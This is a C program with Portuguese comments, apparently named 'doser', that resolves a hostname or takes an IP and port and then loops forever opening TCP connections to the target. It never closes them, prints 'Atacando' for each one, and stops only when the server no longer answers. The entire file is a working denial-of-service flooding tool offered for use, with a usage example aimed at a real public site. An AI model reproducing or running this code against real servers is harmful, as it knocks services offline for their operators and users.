// Ferramentas
// Usando time host e time ./este_programa da para ver que é mais rapido

#include <stdio.h>
#include <stdlib.h>
#include <netdb.h> // Necessario para o gethostbyname
#include <arpa/inet.h> // Necessario para o inet_ntoa que converte para asci
#include <sys/socket.h>
#include <string.h>

int atkDns(const char *dns, const char *porta);
int atkIp(char *ip, const char *porta);

int main(int argc, char *argv[]){
  if(argc < 2){
    fprintf(stderr, "Forma de uso:\nDNS: doser [-d ou --dns] [URL] [PORTA]\nIP: doser [-i ou --ip] [IP] [PORTA]\n\nExemplo: doser -d www.google.com 80\n");
    return;
  }
  else{
    if(strcmp(argv[1], "-d") == 0 || strcmp(argv[1], "--dns") ==0)
      atkDns(argv[2], argv[3]);
    else if(strcmp(argv[1], "-i") == 0 || strcmp(argv[1], "--ip") ==0)
      atkIp(argv[2], argv[3]);
    else
    {
      fprintf(stderr, "Forma de uso:\nDNS: doser [-d ou --dns] [URL] [PORTA]\nIP: doser [-i ou --ip] [IP] [PORTA]\n\nExemplo: doser -d www.google.com 80\n");
    }
  }
  
  
  return 0;
}

int atkDns(const char *dns, const char *porta){
  struct hostent *resolver = gethostbyname(dns);
  struct sockaddr_in alvo;
  int mysocket, conexao;
  int port = atoi(porta);
  char *ip_alvo;
  ip_alvo = inet_ntoa(*((struct in_addr*) resolver->h_addr));
  
  printf("[DNS Resolver]: %s ===> %s\n",dns ,ip_alvo);
  for(;;){ 
    mysocket = socket(AF_INET, SOCK_STREAM, 0);
    alvo.sin_family=AF_INET;
    alvo.sin_port=htons(port);
    alvo.sin_addr.s_addr=inet_addr(ip_alvo);
    conexao = connect(mysocket, (struct sockaddr *)&alvo, sizeof alvo);

    if(conexao == 0){
      printf("Atacando: %s ===> %s:%s\n", dns,ip_alvo, porta);
    }
    else{
       fprintf(stderr, "Servidor fora do ar!\n");
       return;
    }
  }
  
}

int atkIp(char *ip, const char *porta){
  struct sockaddr_in alvo;
  int mysocket, conexao;
  int port = atoi(porta);
  printf("Alvo setado: %s:%s\n", ip, porta);
  for(;;){ 
    mysocket = socket(AF_INET, SOCK_STREAM, 0);
    alvo.sin_family=AF_INET;
    alvo.sin_port=htons(port);
    alvo.sin_addr.s_addr=inet_addr(ip);
    conexao = connect(mysocket, (struct sockaddr *)&alvo, sizeof alvo);
    if(conexao == 0){
      printf("Atacando Servidor ===> %s\n", ip);
    }
    else {
      fprintf(stderr, "Servidor fora do ar!\n");
      return;
    }
  }
}
